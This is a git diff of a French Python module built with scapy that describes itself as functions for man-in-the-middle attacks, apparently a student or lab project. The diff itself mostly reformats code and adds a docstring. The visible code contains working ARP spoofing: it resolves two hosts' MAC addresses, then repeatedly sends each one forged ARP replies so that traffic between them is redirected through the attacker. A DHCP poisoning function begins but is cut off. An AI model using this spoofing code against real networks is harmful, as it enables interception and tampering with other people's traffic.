@@ -1,14 +1,17 @@
+# -*- coding: utf-8 -*-
 #!/usr/bin/env python3
 '''Fichier contenant les fonctions permetant de realiser des attaques MiTM'''
-from scapy.all import ARP,Ether, DHCP, IP, UDP, BOOTP, sendp, srp, sniff, hexdump, get_if_addr, get_if_hwaddr
+
 from time import sleep
 from sys import argv
+from scapy.all import ARP,Ether, DHCP, IP, UDP, BOOTP, sendp, srp, sniff, hexdump, get_if_addr, get_if_hwaddr
 
-def mac(ip:str)->str:
+
+def mac(ip_machine:str)->str:
   '''Recupere l'adresse MAC associer a une adresse IP grace a un message ARP. \n
   ip: est une adresse IP
   '''
-  paquet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=ip) #Paquet ARP evoyer en broadcast 
+  paquet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=ip_machine) #Paquet ARP evoyer en broadcast
   #paquet sert à récuprer une adresse MAC
   rep = srp(paquet, iface='enp0s3') #Reponse au ARP
   return rep[0][0][1].hwsrc #Renvoie l'adresse MAC
@@ -22,7 +25,7 @@ def arp(ipa:str, ipb:str)->None:
   '''
 
   maclist = [mac(ip) for ip in [ipa, ipb]]
-  #On cree deux paquets ARP qui associe l'adresse IP (a et b) 
+  #On cree deux paquets ARP qui associe l'adresse IP (a et b)
   # à l'adresse MAC du PC sur lequel on réalise l'attaque
   paquet1 = Ether(dst=maclist[0])/ARP(op=2, pdst=ipa, psrc=ipb)
   paquet2 = Ether(dst=maclist[1])/ARP(op=2, pdst=ipb, psrc=ipa)
@@ -32,6 +35,11 @@ def arp(ipa:str, ipb:str)->None:
     sleep(5) #Arrete le processus durant X secondes
 
 def dhcp():
+  """DHCP POISONING: \n
+  Procedure permetant de realiser une attaque Man In The Middle par
+  injection de paramètre DHCP froduleux.
+  """
+
   ip_src = get_if_addr('enp0s3')
   mac_src = get_if_hwaddr('enp0s3')
   def dhcp_reply(paquet):
